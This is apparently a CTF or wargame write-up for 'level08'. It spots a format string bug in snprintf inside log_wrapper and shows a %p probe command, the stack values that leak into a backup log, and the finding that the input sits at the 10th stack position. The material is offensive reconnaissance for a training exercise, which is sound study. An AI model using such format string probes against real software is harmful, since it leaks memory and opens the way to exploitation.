# level08

As we can see in `log_wrapper`, the format of `snprintf()` is a variable, creating a vulnerability.  

```sh
$> ./level08 "$(python -c 'print("AAAAAAAA" + "%p "*100)')"

$> cat backups/.log 
LOG: Starting back up: AAAAAAAA0xffffffffffffffec 0xec 0x400d6c 0xffffffffffffffff 0x7fffffffe7ba 0x400d96 0x603010 0x676e697472617453 0x7075206b63616220 0x414141414141203a 0x6666666678304141 0x6666666666666666 0x6578302063656666 0x6430303478302063 0x6666667
```
*Our `'A's` are on the 10th position on the stack.*

